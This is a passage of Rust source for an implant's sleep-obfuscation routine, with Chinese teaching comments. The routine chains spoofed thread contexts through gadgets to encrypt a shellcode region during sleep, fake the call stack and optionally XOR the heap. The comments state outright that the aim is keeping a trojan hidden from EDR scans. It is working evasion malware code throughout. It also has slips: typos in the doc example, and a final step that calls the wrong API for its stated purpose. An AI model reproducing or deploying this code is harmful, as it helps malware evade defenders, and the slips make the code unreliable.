#![allow(unused)]

//use alloc::string::String;//原项目hypnus中用于obfstr的宏展开,samoa中未使用obfstr,而是使用了error.rs中的HypnusError和steal_bail!来error handling

use alloc::collections::btree_map::Keys;
use puerto::winapis::NT_SUCCESS;
use spin::mutex;
// uwd库中lib.rs使用了pub use uwd::*;=uwd::uwd::AsPointer
use obfstr::obfstr as obf;
use puerto::types::NTSTATUS;
use uwd::AsPointer;

use crate::allocator::HypnusHeap;
use crate::error::HypnusError::{
    InvalidArguments, NtCreateEventFailed, NtDuplicateObjectFailed, NtWaitForSingleObjectFailed,
    TpAllocPoolFailed, TpAllocTimerNtSetEventFailed, TpAllocTimerRtlCaptureContextFailed,
    TpSetPoolStackInformationFailed,
};
use crate::types::{
    CONTEXT_FULL, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, RTL_HEAP_WALK_ENTRY,
    THREAD_ALL_ACCESS, TP_CALLBACK_ENVIRON_V3, TP_POOL_STACK_INFORMATION,
};
use crate::winapis::{
    CloseThreadpool, NtAlertResumeThread, NtClose, NtCreateEvent, NtDuplicateObject,
    NtQueueApcThread, NtSetEvent2, NtSignalAndWaitForSingleObject, NtWaitForSingleObject,
    RtlWalkHeap, TpAllocPool, TpAllocTimer, TpAllocWait, TpSetPoolMaxThreads, TpSetPoolMinThreads,
    TpSetPoolStackInformation, TpSetTimer, TpSetWait,
};
use crate::{debug_log, hypnus, stealth_bail};
use core::ptr::null;
use core::task::Context;
use core::{ffi::c_void, mem::zeroed, ptr::null_mut, time};

use crate::config::{Config, current_rsp, init_config};
use crate::error::{HypnusError, Result};
use crate::gadget::GadgetContext; // gadgetcontext是一个trait,其内部是fn jmp(),因为jmp没有pub,只能通过引入gadgetcontext的方式引入jmp() // 代替源码hyonus中anyhow的Result

use puerto::types::{
    CONTEXT, DUPLICATE_SAME_ACCESS, EVENT_ALL_ACCESS, EVENT_TYPE, HeapAllocFn, LARGE_INTEGER,
};
use puerto::winapis::{NtCurrentProcess, NtCurrentThread};

/// initiates execution obfuscation using the tpsettimer
/// 
/// # Example
/// 
/// ```
/// #![no_std]
/// #![ni_main]
/// 
/// extern crate alloc
/// 
/// use hypnus::{foliage,ObfMode};
/// use hypnus::alloctore::HypnusHeap
/// use core::ffi::c_void
/// 
/// #[global_allocator]
/// static ALLOCATOR::HypnusHeap=HypnusHeap;
/// 
/// // pointer to the memory region you want to obfuscate(e.g. , shellcode)
/// // 对应汇编 NOP(用于内存对齐或占位,什么都不做); NOP; NOP; INT 3;(软件断点) : 经典安全的测试桩Stub,代替真实木马载荷,安全测试hypnus加载器是否成功修改权限,解密并运行这段代码,而不产生实质危害
/// let data = b"\x90\x90\x90\xCC" // b代表&[u8;4]
/// let ptr = data.as_ptr() as *mut c_void;
/// let size = data.len() as u64;
/// 
/// // sleep dutation in seconds
/// let delay = 5;
/// loop{
/// // full obfuscation with heap encryption and rwx memory protection
/// timer!(ptr,size,delay,ObfMode::Heap | ObfMode::RWX)
/// }
/// 
/// ```



/// Enumeration of supported memory obfuscation strategies
///
/// 用于指定休眠混淆的底层调度方式(线程池/APC),并用于fiber入口处路由执行框架;无论Timer还是Foliage,核心主载荷的加密方式都是写死的(ROP链中的SystemFunction040)
pub enum Obfuscation {
    /// The technique using windows thread poll(TpSetTimer)
    /// 单元变体（Unit Variant):该类型不携带数据,写出全名就是初始化
    Timer,
    /// The technique using windows thread poll(TpSetWait)
    Wait,
    /// The technique using Apc(NtQueueApcThread)
    Foliage,
}

// derive相关 详见rust grammer
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
// 代表透明内存布局(编译时,把该类型当作其内部的类型对待):强制ObfMode结构体内部字段布局和定义时的内部字段完全一致(物理内存中的大小(等于u32的4字节大小)/对齐(等于u32的4字节对齐)/abi(如一个函数接收这个类型的参数时,与接收一个u32没有区别.
// 如果没有这个属性,编译器可能把这个结构体通过栈/指针来隐式传递).加上这属性让其与u32一致,不能有多余padding,避免rustc的优化(默认是#[repr(Rust)]).使ObfMode中u32的值和物理属性与u32完全一致.
// 这是rust的零成本抽象,写源码时,不能把普通u32传给ObfMode,保证了类型安全;在编译后的运行期,ObfMode的外壳被剥离,内存中只留下一个u32.可以把ObfMode直接写入R9寄存器
#[repr(transparent)]
/// 元组结构体(包含一个匿名字段/成员);
/// 是Rust中的NewType模式:即用结构体包装一个已有类型以提供类型安全;
/// 该结构体用于表示:混淆中是否开启额外的内存操作特权(是私有堆独立加密/主载荷的rwx权限妥协).该结构体ObfMode不改变使用的加密方式(SystemFunction040),只更改内存权限
pub struct ObfMode(pub u32);

/// 后续会手动传入timer!/wait!/Hypnus结构体.在执行时,会通过这个值决定如何操作内存加密
impl ObfMode {
    // Rust中,在impl中为结构体定义附属于该类型的常量,称为关联常量(非常Idiomatic Rust的设计模式):以ObfMode::Heap的形式使用,且其命名空间被锁定在ObfMode:: 空间中,不会与rust prelude的Option::None发生冲突.如果不在impl块中定义pub const None: ObfMode = ObfMode(0b0000);则会污染当前模块的命名空间.
    // 这么写的好处:1. 模拟enum类型,同时保持 #[repr(transparent)]的底层物理特性.如果使用enum会有tag标识. 2. 高内聚性encapsulation:符合面向对象驱动的设计思想,None\Heap\Rwx是ObfMode类型的合法预设值,将它们和ObfMode绑在一起,提升代码可读性
    // 这三个常量的生命周期:在Rust中,只要是const关键字定义的常量,无论在什么地方,其生命周期和内存行为都是一致的. 1. const在编译时会被直接内联到所有调用它的地方(即查找和替换,不占用任何真实的内存地址):在运行时ObfMode::None没有一般变量的堆栈生命周期,不占用运行时的变量生存期,不会在程序运行期间被释放/销毁 2. 若取其引用,自动提到'static.rustc将该常量的值放入程序只读数据段.rdata
    // 这里的None是一个全局公开常量,其内部的值是ObfMode(0b0000);借助#[repr(transparent)],其本质是一个u32,但在Rust类型系统角度,它是一个新的ObfMode类型.
    // None不是rust关键字(是core::option::Option::None).且控制在impl ObfMode命名空间中,不会和预导入的None冲突
    pub const None: Self = ObfMode(0b0000);

    // ObfMode结构体内部只有一个u32,后面的Heap/Rwx都是ObfMode这个结构体的不同值(封装了不同的u32)
    pub const Heap: Self = ObfMode(0b0001);

    pub const Rwx: Self = ObfMode(0b0010);

    /// Checks whether the flag contains another `ObfMode`.
    ///
    /// 该函数参数传入self,但上面对ObfMode derive了copy.self从移动所有权变成了按位复制.不改变原所有权,把复制的数据给了函数
    /// 这是底层开发中的掩码检测bitmask check:检查当前配置中是否包含传入的值.实质是对u32的&操作,可以在cpu的单一时钟周期完成,没有任何性能损失.
    fn contains(self, other: ObfMode) -> bool {
        (self.0 & other.0) == other.0
    }
}

/// 重载|操作符(针对ObfMode)
/// 如前所述,，ObfMode 物理上是个 u32，但类型上是个独立的 struct ObfMode,ObfMode::Heap和ObfMode::Rwx是同一类型.但rust中,即使两个变量是完全相同的自定义结构体类型(注意是 自定义结构体类型),默认情况下也不能对它们使用任何运算符(+ - * |).
/// rustc视角下:ObfMode是一个newtype,rustc不会主动检查里面是不是u32,如果里面有两个u32(此处只有1个),| 的时候rustc根本不知道四个u32怎么运算.所以,rust规定,除非显示重载,不支持任何自定义结构体使用任何运算符.
impl core::ops::BitOr for ObfMode {
    type Output = Self;

    fn bitor(self, rhs: Self) -> Self::Output {
        ObfMode(self.0 | rhs.0)
    }
}

/// Structure responsible负责 for centralizing memory obfuscation techniques
///
/// 该结构体封装目标载荷的内存(base,size表示),休眠时钟(timer),底层api地址(cfg),混淆时的内存权限(ObfMode).
///
/// 项目于中所有具体执行流(timer/wait/foliage三个函数)都是在该结构体上实现的
#[derive(Clone, Copy, Debug)]
struct Hypnus {
    /// base memory pointer to be manipulated or operated on
    base: u64,

    size: u64,

    /// delay time in seconds
    time: u64,

    /// resolved winapi required for execution
    // cfg:&'static Config,
    cfg: &'static Config,

    /// Obfuscantion modes
    mode: ObfMode,
}

impl Hypnus {
    /// create a new Hypnus structure
    #[inline]
    fn new(base: u64, size: u64, time: u64, mode: ObfMode) -> Result<Self> {
        if base == 0 || size == 0 || time == 0 {
            stealth_bail!(InvalidArguments, "invalid arguments")
        }
        // 这里返回的结构体中的字段和定义时的顺序不一致,没有任何影响.因为: 1. 命名结构体是通过明确的字段名匹配的,而不是物理位置 2. 该结构体的内存布局是由定义时的字段顺序决定的,而不是初始化决定的 3. 只有在实例化元组结构体(内部是匿名字段)才不能改变字段顺序
        Ok(Self {
            base,
            size,
            time,
            // 在宏调用时赋予了实参.这是省略写法=mode:mode, rust中,实例化一个结构体时,如果当前作用域内存在一个与结构体字段同名的变量.可以省略:value的赋值部分
            mode,
            cfg: init_config()?,
        })
    }

    /// performs memory obfuscation using a thread-pool timer sequence,线程池和事件组合
    fn timer(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use:heap是ObfMode字段的值.代表是否在木马休眠期,对存储动态数据的私有堆进行全盘XOR异或加密.即执行后面的obfuscate_heap及解密
            let heap = self.mode.contains(ObfMode::Heap);

            // 内存权限:载荷解密后使用rx还是rwx.即木马休眠结束,工作线程跑完解密.把主载荷代码段还原为什么样的内存属性.如果ObfMode开启RWX将载荷权限置为RWX,否则默认置为RX
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };
            // 以上,这两个配置决定了木马的存活率:ObfMode::Heap是必要的,EDR的静态内存扫描会定期审查进程堆区,如果把c2配置或加密后的payload明文留在堆区,不进行堆加密很快被发现.
            // 避免RWX属性:win下RWX的内存页是edr重点,极易引发警报.不建议开启RWX.这样运行期载荷处于RX,休眠期改为RW并加密,休眠醒来改为RX.这样实现最大化的免杀隐蔽.

            // 后续用到的三个event的载体
            let mut events = [null_mut(); 3];

            for event in &mut events {
                // ffi的extern "system"方式调用win native api.NtCreatEvent是常见且大量的调用,EDR没有精力全部分析.
                let status = NtCreateEvent(
                    // 输出:成功的事件对象handle
                    event,
                    EVENT_ALL_ACCESS,
                    null_mut(), // 传空代表该事件是anonymous的.EDR对有名事件在扫描全局对象目录时很容易发现.anonymous对象只存于当前进程句柄表,隐匿性最高
                    EVENT_TYPE::NotificationEvent, //设置为有信号的通知型事件:会一直保持有信号状态,直到被重置(在hypnus的异步链中,一个事件可能被多个context同时等待,通知型事件能确保所有监听者都能收到信号)
                    0, // 初始为无信号状态,意味着所有等待该事件的线程都会立即挂起,直到后续有指令发其他信号);
                );

                if !NT_SUCCESS(status) {
                    stealth_bail!(NtCreateEventFailed, "NtCreateEvent Failed"); // 宏后面不加 ;也不影响(真正执行在宏展开时),但为了保持代码整洁应加上. 
                }
            }

            // 开始配置并初始化一个 threadpool
            // Allocate dedicated threadpool with one worker

            // 用来表示指向_TP_POOL结构体的句柄(内核和ntdll.dll中,管理维护一个线程池实例):代表整个线程池的根,后续所有线程数量/工作队列/声明周期等都在这个poll指针进行挂载
            let mut pool: *mut c_void = null_mut();

            // 用TpAllocPool在用户态堆区分配并初始化一个TP_POOL结构体,返回一块堆内存的首地址(纯粹的用户态指针),但此时并没有产生真正的worker factory.是一种延迟初始化设计
            // 只有线程池开始共工作(设置线程池数量/提交第一个异步任务),才会通过系统调用向内核申请创建worker factory
            let mut status = TpAllocPool(
                &mut pool, // 对应的参数类型是指针的指针,所以尽管pool本身是copy的,这里也需要用&
                null_mut(),
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(TpAllocPoolFailed, "TpAllocPool Failed")
            }

            // Configure threadpool stack size
            // 0x80000=512kb,这个4kb是怎么计算得到的,见注释1
            let mut stack = TP_POOL_STACK_INFORMATION {
                StackCommit: 0x80000,
                StackReserve: 0x80000,
            };
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    TpSetPoolStackInformationFailed,
                    "TpSetPoolStackInformation Failed"
                )
            }

            // 设置该线程池中线程串行执行,消除竞争.产生真正的worker factory
            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            /// prepare callback environment,将后续所有异步任务强行绑定到自定义的私有单线程池上.详见hypnus.md
            let mut env = TP_CALLBACK_ENVIRON_V3 {
                Pool: pool,
                ..Default::default()
            };
            // 线程池配置完成

            // capture the current thread context
            // 定义第一个定时器句柄
            let mut timer_ctx: *mut c_void = null_mut();
            /// 代表当前所有寄存器状态快照:rcx置为RtlCaptureContext的地址
            /// 在主线程开辟1.2kb空间(sizeof(CONTEXT)).后续将代表寄存器状态快照(CONTEXT),[rcx](rcx是寄存器地址)置为RtlCaptureContext的地址.
            /// 后续trampoline执行jmp [rcx]时,cpu就跳入ntdll!RtlCaptureContext开始执行
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // 分配第一个定时器对象timer_ctx:与win api RtlCaptureCpntext绑定,由于这个api是微软编译好的系统只读api,且存在rdx 和 rcx的寄存器错位,所以需要trampoline调整(注意和第二个定时器的区别)
            // 本项目作用:见下一个函数TpSetTimer
            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.
            status = TpAllocTimer(
                // 输出:代表该函数成功执行后,内核新创建的定时器对象TP_TIMER的虚拟内存地址指针(用户态程序拿到的永远是VA)
                &mut timer_ctx,
                // 回调(定时器触发后执行的回调函数入口地址):指向trampoline:Config中的trampoline(mov rcx,rdx .. jmp [rcx]).而P1Home(对应执行时寄存器解引用的[rcx])已经在ctx_init中设为RtlCaptureContext的地址.trampoline为了解决线程池固定回调签名和RtlCaptureContext签名在win64寄存器传参的物理冲突. 见hypnus.md(TpAllocTimer中的trampoline)
                self.cfg.trampoline as *mut c_void,
                // 回调函数执行时的寄存器状态(CONTEXT). 语法方面详见注释2
                &raw mut *&mut ctx_init as *mut _ as *mut c_void,
                // 回调函数执行时,使用的线程池环境
                &mut env,
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    TpAllocTimerRtlCaptureContextFailed,
                    "TpAllocTimer [RtlCaptureContext] Failed"
                )
            }

            // LARGE_INTEGER win特有的64位的union:用于表示超大整数.是win处理系统时间/性能/计数的唯一标准
            // core::mem::zeroed,将该64位内存全部刷为0(但不包括结构体中个字段中间的padding),防止被之前脏数据干扰.
            let mut delay = zeroed::<LARGE_INTEGER>();

            // win内核的时间精度是100纳秒(1ms毫秒=1000us微秒;1us=10*100纳秒).1ms=10000个100纳秒单位.即100i64 * 10_000表示100ms
            // win下,正数代表绝对时间,从1601年1月1日起算的总刻度;负数代表相对时间,从现在起算.
            // 这里代表100ms后执行
            delay.QuadPart = -(100i64 * 10_000);

            // 激活第一个定时器对象timer_ctx,将TpAllocTimer分配的这个定时器对象激活,开始倒计时
            // 本项目作用:主线程100ms后触发定时器,主线程调用NtWaitForSingleObject挂起自身.定时器触发后,内核唤醒私有线程池中唯一的worker执行trampoline,在trampoline中引导cpu执行ntdll!RtlCaptureContext将该worker此刻寄存器状态写入ctx_init.后续以此为基础设置10个ctx
            TpSetTimer(
                // 输出参数,由tpalloctimer产生,在调用TpSetTimer前,已经被TpAllocTimer填入
                timer_ctx,  // 唤醒时刻
                &mut delay, // 周期msperiod,0代表是one-shot单次触发任务;
                0,
                // msWindowLength - 时间窗口:允许系统延迟执行的宽限期.0代表只要倒计时一归零，必须立刻发送唤醒信号(实际执行中受硬件时钟终端频率限制(一般15.6ms),除非使用timeBeginPeriod修改系统时钟频率)
                0,
            );
            // 第一个定时器timer_ctx配置完成

            // 设置第二个定时器:第一个定时器执行RtlCaptureContext捕获快照后,直接返回,主线程继续休眠.第二个定时器设为200ms,去点亮events[0]
            let mut timer_event = null_mut();

            // 第二个定时器绑定的是事件events[0]:用于通知主线程快照已经抓完,可以继续向下执行.
            //
            status = TpAllocTimer(
                // 输出:第二个定时器handle
                &mut timer_event,
                // win api:将事件对象从无信号转为有信号 详见注释3
                NtSetEvent2 as *mut c_void,
                //  函数开头创建的第一个事件handle
                // 1. events[0]->TpAllocTimer(事件与定时器绑定);2. 定时器触发-> events[0] 被塞进 CPU 的 RDX 寄存器(根据回调函数的约定,这里的第三个参数作为回调函数的第二个参数);3. NtSetEvent2 被调用 -> 它用 RDX中的handle,去内核发起系统调用
                events[0],
                &mut env,
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    TpAllocTimerNtSetEventFailed,
                    "TpAllocTimer [NtSetEvent] Failed"
                )
            }

            // 将主线程(当前线程)陷入休眠(将events[0]绑定到NtWaitForSingleObject),直到指定的events[0]信号出现,才继续执行主线程
            // Wait for context capture to complete
            status = NtWaitForSingleObject(
                // 等待的事件对象句柄
                events[0],
                // 是否可被其他中断唤醒
                0,
                // 等待时长(这里代表事件信号出现就立即执行)
                null_mut(),
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(NtWaitForSingleObjectFailed, "NtWaitForSingleObject Failed")
            }

            // 主线程陷入休眠,开始构建十个ctx
            // Build multi-step spoofed CONTEXT chain
            // 每个ctx_init都是cpu的瞬时寄存器数据,用于加载到NtContinue,通过Ntcontinue构建config,然后修改config执行指定的函数.
            // 根据上面获取的快照ctx_init,伪造10份.CONTEXT derive copy,这里在内存(栈)执行了10此memcpy.即创建了10个一样的执行环境,每个都有该线程池的线程的原始寄存器状态
            let mut ctxs = [ctx_init; 10];
            // 将10个ctx的rax置为NtContinue的地址,然后将栈向低地址扩张8个字节,用来在rsp指向的空间中保存伪造的返回地址(ROP链中下一跳的地址).防止原栈顶数据被覆盖
            // 因为ASLR的存在,ntcontinue的va是动态随机的.因此不能在编译阶段将其地址硬编码在静态的机器码中.所以要动态解析其地址并存入ctx.rax中,之后通过trampoline(cfg.callback)读取并跳转
            for ctx in &mut ctxs {
                // NtContinue接收一个context,强迫cpu变成context描述的状态
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // Duplicate thread handle for context manipulation
            // NtCurrentThread() （伪句柄  -2)代表当前工作线程.t_thread通过NtDuplicateObject获取主线程的绝对真实句柄.锁定这个绝对句柄一定也只能指向主线程
            let mut h_thread = null_mut();

            // NtDuplicateObject,内核提供的handle克隆api.在内核句柄表(handle table)中,创建新索引条目,该条目指向一个存在的内核对象.可以跨进程克隆句柄,可以在同一进程中将受限/临时的句柄转为永久/有完全访问权限的实体句柄
            // 其核心功能是将源进程表中的一个对象句柄索引，在目标进程（或同进程）的句柄表中创建一个新的有效条目，并根据权限掩码（ACCESS_MASK）赋予其相应的访问能力
            // 在该项目中，此函数的作用是将当前线程的“伪句柄（Pseudo-handle）”转换为具备完整访问权限的“真实内核对象句柄”，以解决多线程异步环境下的定位冲突.这里将伪句柄(-2)传给ctx.rcx传给,
            status = NtDuplicateObject(
                // 源进程
                NtCurrentProcess(),
                // 源对象
                NtCurrentThread(),
                // 目标进程
                NtCurrentProcess(),
                // 目标对象
                &mut h_thread,
                // 期望权限
                0,
                // 句柄属性
                0,
                // 复刻源的所有权利
                DUPLICATE_SAME_ACCESS,
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(NtDuplicateObjectFailed, "NtDuplicateObject Failed")
            }

            // 调用config.rs中的spoof_context(),构建伪造的回溯链
            // Base CONTEXT for spoofing
            ctx_init.Rsp = current_rsp();
            // spoof_context不是针对某个函数/payload的伪造栈,而是伪造了整个回溯链.这里ctx_init提供当前栈的所有寄存器状态
            // EDR回溯的起点是rsp指向的栈槽位,即使rip里是payload地址,也不影响伪造栈.即,这里从payload之后开始一直伪装到回溯的根部
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // 开始构造10个ctx(类型是CONTEXT):在jmp()中,找到合适的jmp <reg>,然后将gadget(jmp <reg>)赋给ctx.rip,将敏感函数地址存入gadget的通用寄存器中.之后用每个ctx的rcx/rdx/r8/r9用来传递被调用的敏感api需要的参数.效果是在ntcontinue执行这个gadget时通过jmp <reg>执行了敏感函数
            // The chain will wait until `event` is signaled
            //
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            // 该函数有3个参数
            // 将events[1]和NtWaitForSingleObject绑定:只有events[1]发信号这个绑定的函数才会执行
            ctxs[0].Rcx = events[1] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8 = 0;

            // Temporary RW access:将原本rx的内存属性转为rw,用于写入
            // 设置ctxs[1]:ROP链中改变shellcode内存属性的环节
            let mut old_protect = 0u32;
            // base和size本身就是指针(u64),这里遮蔽为可变指针
            // NtProtectVirtualMemory要求传入指针的指针,且可能因为内存对齐对内存进行修改.
            // 因此这里拷贝一份木马的内存,用于后面操作木马的内存?
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            // 注意下面的base和size通过as_u64()将各自
            // base.as_u64是否从下从mut self 到&mut self的转换?从而通过该函数得到指向base(u64类型,其本身就是一个指针)的指针?
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8 = size.as_u64();
            // shellcode通常是rx,但下一步需要XOR加密,需要暂时改为rw
            ctxs[1].R9 = PAGE_READWRITE as u64;
            // NtprotectVirtualMempry有5个参数,这里只配置了4个,第五个参数后面通过((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64())在栈上写入第五个参数的代码.为啥这里不直接写完第五个参数呢?

            // ctxs[2]:Encrypt region:利用系统自带加密函数SystemFunction040对shellcode加密
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size; // 该 native api要求此值必须是8字节对齐,这里是否需要进行检查?
            // 对应RTL_ENCRYPT_OPTION_SAME_PROCESS:加密后的数据仅能在当前进程内解密
            ctxs[2].R8 = 0;

            //ctxs[3]:backup context备份当前线程状态
            // 作用:
            let mut ctx_backup = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                ..Default::default()
            };
            // jmp函数将ctxs[3].rip指向一个系统合法(三个dll中)的gadget(jmp <reg>),根据找到的reg将target函数NtThreadContext的地址放进去.该函数读取指定线程的cpu寄存器快照;必须使用NtThreadContext,这时唯一能获取包括rsp/eflags(状态位)在内,能够完整描述一个线程状态的官方接口
            (&mut ctxs[3]).jmp(self.cfg, self.cfg.nt_get_context_thread.into());
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // ctxs[4]:Inject spoofed context:
            // NtSetContextThread是SetThreadContext的底层系统调用:允许一个进程强制重写指定线程的cpu寄存器状态.内核强行修改cpu硬件层面的寄存器值,使得线程在下一次cpu时钟周期恢复执行时,直接变为提供的新状态
            ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[4].Rcx = h_thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // sleep:将当前线程陷入休眠
            // shellcode的内存已加密(ctxs[2]),当前线程的栈帧已伪造(ctxs[4]),线程处于合法等待状态
            // 此后当前线程带着伪造的栈帧运行.下面调用WaitForSingleObject,当前的stack Unwind是ctxs[4]伪造好的
            ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
            // WaitForSingleObject的第一个参数是陷入休眠的线程handle,这里置为当前线程.让线程等待自己结束,这样方式来陷入休眠(通常线程只有在terminate结束时才变为有信号状态,让线程等待一个在休眠期间永远不会发生的信号,这样强制利用超时机制达到sleep.WaitForSingleObject是系统常见行为,而sleep是edr检测重点).
            ctxs[5].Rcx = h_thread as u64;
            // 休眠时间(ms)
            ctxs[5].Rdx = self.time * 1000;
            // 对R8清零
            ctxs[5].R8 = 0;

            // decrypt region:将休眠期加密的payload内存恢复为可执行的原始状态.systemfunction041底层是RtlDecryptMemory
            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
            ctxs[6].Rcx = base;
            // 解密长度,必须与加密时sie一致且8字节对齐
            ctxs[6].Rdx = size;
            // 对应SAME_PROCESS,确保使用与加密时相同的内核密钥进行还原
            ctxs[6].R8 = 0;

            // restore修复/还原 protect:利用NtProtectVirtualMemory将之前为了加密改为RW权限的内存区域,还原回原始可执行权限.
            // ctxs[7]的rip被预置为一个合法的jmp <reg>地址,将NtProtectVirtualMemory的真实地址注入到gadget使用的寄存器中(rax/r11).这种方式避免了直接调用敏感syscall,而是通过合法的jmp指令间接跳转.
            ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8 = size.as_u64();
            ctxs[7].R9 = protection;
            // 该函数有五个参数,第五个参数后续手动添加到栈上

            // restor thread context:NtSetContextThread 是内核级系统调用，通过强制重写 CPU硬件寄存器，将指定线程的执行状态瞬间切换至预设的上下文环境
            ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            // h_thread是前文NtDuplicateObject获取的当前线程的真实内核handle.在进行上下文操作时,不能使用伪句柄(NtCurrentThread),内核通常要求提供具备THREAD_SET_CONTEXT访问权限的真实handle,以确保操作的合法和安全
            ctxs[8].Rcx = h_thread as u64;
            // 提供指向一个CONTEXT结构体首字节的指针,内核将根据该结构体中的值重置cpu寄存器.这里提供的是前文备份的CONTEXT
            ctxs[8].Rdx = ctx_backup.as_u64();

            // final event notification
            // NtSetEvent是内核级系统调用,用于将指定的内核事件对象设置为actived状态,从而解除其他线程对该事件的阻塞等待
            ctxs[9].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            // 指定要激活的同步信号event[2]:用于激活前文等待的主线程
            ctxs[9].Rcx = events[2] as u64;
            // 被接收事件在修改之前状态(指向LONG类型的指针).此时置为0,因为这里并不关心事件之前的状态
            ctxs[9].Rdx = 0;
            // 10个ROP链执行结束,通过将events[2]actived,唤醒主线程继续执行

            // layout spoofed CONTEXT chain on stack
            self.cfg
                .stack
                .spoof(&mut ctxs, self.cfg, Obfuscation::Timer)
                .map_err(|_| HypnusError::TimerLayoutSpoofFailed)?;

            // patch old_protect into expected return slots
            // 这里只是写入数据,没有开始执行.但必须等self.cfg.stack.spoof()执行之后,确定了伪造栈的结构,才能确定ctxs[1]和ctxs[7]对应的rsp,才能继续往伪造栈帧上添加参数函数.因为在此之前rsp随着执行流一直在变化
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // schedule each CONTEXT via TpSetTimer:在堆区装配10个独立的定时器任务,为后续的10个ROP链的流转准备好底层数据结构的绑定.但并没有真正开始计时,处于静止状态,直到TpSetTimer才开始启动
            for ctx in &mut ctxs {
                let mut timer = null_mut();
                status = TpAllocTimer(
                    // 输出:内核定时器对象指针
                    &mut timer,
                    // 统一的入口回调函数(trampoline)
                    self.cfg.callback as *mut c_void,
                    //  ctxs[n]的内存地址
                    ctx as *mut _ as *mut c_void,
                    // 绑定私有执行环境
                    &mut env,
                );

                if !NT_SUCCESS(status) {
                    stealth_bail!(HypnusError::TpAllocTimerFailed, "TpAllocTimer Failed");
                }

                // add 100ms per step
                delay.QuadPart += -(100_i64 * 10_000);

                TpSetTimer(timer, &mut delay, 0, 0);
            }

            // Optional heap encryption :如果在配置中开启ObfMode::Heap,则在主线程挂起之前,将自定义堆中分配的内存块全部XOR加密
            let key=
            // if在c/c++中是statement没有返回值,在rust中是expression表达式,有返回值
            if heap {
                let key= core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // ring 0的单一syscall,在同一不可中断的时钟周期,将events[1] actived,将当前线程挂起,等待events[2]
            // events[1]绑定ctxs[0],actived后解除混淆链阻塞,依次执行后面的ctxs;events[2]绑定ctxs[9],确定10个ctx全部完成.期间主线程一直处于挂起,不占用cpu
            status = NtSignalAndWaitForSingleObject(events[1], events[2], 0, null_mut());
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    HypnusError::NtSignalAndWaitForSingleObjectFailed,
                    "NtSignalAndWaitForSingleObject Failed"
                );
            }

            // undo heap encryption:撤销堆加密
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Cleanup:win内核中,所有东西(线程/事件/文件)都是由对象管理器管理.管理器会对象加引用计数,并在当前进程句柄表分配slot指向对应的内核对象.
            // NtClose:通知内核释放该句柄表的插槽。由于当前线程本身还在运行（主线程没死），内核对象的引用计数减 1，不会销毁线程本身，但切断了这条多余的访问通道
            NtClose(h_thread);
            // 释放当初通过 TpAllocPool 创建的那个私有单线程池（TP_POOL）.底层会通知内核销毁绑定的 Worker  Factory，拆除底层的 IOCP（I/O完成端口）队列，并安全地终止那个帮我们跑完 ROP 链的 Worker 线程。所有属于这个线程池的 _TP_TIMER 结构体也会被悉数回收
            CloseThreadpool(pool);
            // 将所有的内核 KEVENT对象的句柄关闭。由于没有其他人再引用这些事件，它们的引用计数归零，内核立刻将其占用的 Non-Paged Pool（非分页内存）回收
            events.iter().for_each(|h| {
                NtClose(*h);
            });

            Ok(())
        }
    }

    /// performs memory obfuscation using a thread-pool wait-based strategy:使用TpAllocWait / TpSetWait在线程池中注册TP_WAIT结构体
    ///
    /// 1. 主线程在栈上创建4个无信号的事件events[0..3]
    /// 2. 配置快照任务:主线程配置wait_ctx异步任务,并绑定回调函数trampoline和参数ctx_init.随后开启监听events[0],设置超时时间100ms
    /// 3. 配置通知任务:主线程配置wait_event,并绑定回调函数NtSetEvent2和参数events[1].随后开启监听events[0],超时时间200ms
    /// 4. 主线程挂起:主线程调用 NtWaitForSingleObject(events[1], 0, null_mut()) 阻塞自身
